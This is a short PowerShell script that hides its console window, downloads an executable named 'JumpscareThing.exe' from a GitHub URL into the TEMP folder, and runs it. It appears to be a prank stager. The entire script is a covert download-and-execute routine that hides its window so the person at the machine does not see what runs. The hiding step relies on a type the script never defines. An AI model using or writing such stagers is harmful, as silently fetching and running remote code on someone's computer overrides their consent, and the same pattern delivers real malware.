function Hide-Console
{
    $consolePtr = [Console.Window]::GetConsoleWindow()
    #0 hide
    [Console.Window]::ShowWindow($consolePtr, 0)
}
Hide-Console

$url = "https://github.com/LordRyan1999/JumpscareThing/raw/main/JumpscareThing.exe"
$outpath = "$env:TEMP/JumpscareThing.exe"
Invoke-WebRequest -Uri $url -OutFile $outpath

$args = @("Comma","Separated","Arguments")
Start-Process -Filepath "$env:TEMP/JumpscareThing.exe" -ArgumentList $args
